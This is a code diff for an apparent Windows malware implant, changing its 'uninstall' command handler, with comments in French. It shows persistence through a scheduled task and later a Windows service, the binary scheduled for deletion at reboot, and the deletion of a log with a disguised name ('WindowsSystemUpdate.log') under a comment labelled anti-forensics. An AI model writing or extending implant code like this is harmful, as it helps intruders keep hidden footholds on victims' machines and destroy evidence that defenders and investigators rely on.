@@ -1,62 +1,87 @@
 #include "cleaner.h"
 #include "config.h"
+#include "error.h"
+#include "log.h"
+#include "service.h"
 #include <windows.h>
-#include <iostream>
 #include <string>
 
 
 std::string cmd_uninstall() {
-	std::string result = "";
-	char exe_path[MAX_PATH];
+    std::string result;
 
-	//Récupération du chemin de l'exécutable
-	if (GetModuleFileNameA(NULL, exe_path, MAX_PATH) == 0) {
-		result = "Erreur lors de la récupération du chemin de l'exécutable.";
-		return result;
-	}
+    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
+    if (!scm) {
+        result = format_last_error("OpenSCManager");
+        return result;
+    }
 
-	//Suppression de la tâche planifiée via schtasks
-	std::string task_name = TaskName;
-	std::string command = "C:\\Windows\\System32\\schtasks.exe /Delete /TN \"" + task_name + "\" /F";
+    SC_HANDLE service = OpenServiceW(scm, ServiceNameW,
+        SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
+    if (!service) {
+        const DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
+            result = "Service deja absent.";
+        }
+        else {
+            result = format_error(err, "OpenService");
+            CloseServiceHandle(scm);
+            return result;
+        }
+    }
+    else {
+        SERVICE_STATUS status{};
+        if (ControlService(service, SERVICE_CONTROL_STOP, &status)) {
+            result = "Arret du service demande.";
+            // Attente bornée (5 s) : le SCM prend le relais sinon.
+            for (int i = 0; i < 50; ++i) {
+                SERVICE_STATUS_PROCESS sp{};
+                DWORD needed = 0;
+                if (!QueryServiceStatusEx(service, SC_STATUS_PROCESS_INFO,
+                        reinterpret_cast<LPBYTE>(&sp), sizeof(sp), &needed)) break;
+                if (sp.dwCurrentState == SERVICE_STOPPED) break;
+                Sleep(100);
+            }
+        }
+        else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
+            result = "Service deja arrete.";
+        }
+        else {
+            result = format_last_error("ControlService(STOP)");
+        }
 
-	STARTUPINFOA si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_HIDE; // Masquer la fenêtre de la console
-	ZeroMemory(&pi, sizeof(pi));
+        if (DeleteService(service)) {
+            result += "\nService marque pour suppression.";
+        }
+        else {
+            result += "\nEchec DeleteService : " +
+                format_error(GetLastError(), "DeleteService");
+        }
 
-	char cmd[1024];
-	strcpy_s(cmd, command.c_str());
+        CloseServiceHandle(service);
+    }
+    CloseServiceHandle(scm);
 
-	if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-		WaitForSingleObject(pi.hProcess, INFINITE);
-		DWORD exit_code = 0;
-		GetExitCodeProcess(pi.hProcess, &exit_code);
+    // Suppression du binaire au reboot (le processus courant le verrouille encore).
+    char exe_path[MAX_PATH] = {};
+    if (GetModuleFileNameA(nullptr, exe_path, MAX_PATH) != 0) {
+        if (MoveFileExA(exe_path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT)) {
+            result += "\nExecutable supprime au prochain redemarrage.";
+        }
+        else {
+            result += "\nEchec MoveFileEx : " +
+                format_error(GetLastError(), "MoveFileEx");
+        }
+    }
 
-		if (exit_code == 0) {
-			result = "Tâche planifiée supprimée avec succès.";
-		}
-		else {
-			result = "Erreur lors de la suppression de la tâche planifiée. Code de sortie : " + std::to_string(exit_code);
-		}
-		CloseHandle(pi.hProcess);
-		CloseHandle(pi.hThread);
-	}
-	else {
-		result = "Impossible de lancer le schtasks.exe.\n";
-	}
+    // Nettoyage preventif de l'ancien fichier de log (anti-forensics).
+    char program_data[MAX_PATH] = {};
+    if (GetEnvironmentVariableA("ProgramData", program_data, sizeof(program_data))) {
+        std::string old_log = std::string(program_data) + "\\WindowsSystemUpdate.log";
+        DeleteFileA(old_log.c_str());
+    }
 
-	//Planification de la suppression de l'exécutable au prochain redémarrage
-	if (MoveFileExA(exe_path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)) {
-		result += "\nLe programme sera supprimé au prochain redémarrage.";
-	}
-	else {
-		result += "Impossible de planifier la suppression de l'executable (code: " + std::to_string(GetLastError()) + ").\n";
-	}
-
-	result += "\nDeconnexion imminente de l'implant...\n";
-
-	return result;
+    result += "\nArret de l'implant demande.";
+    request_self_stop();
+    return result;
 }
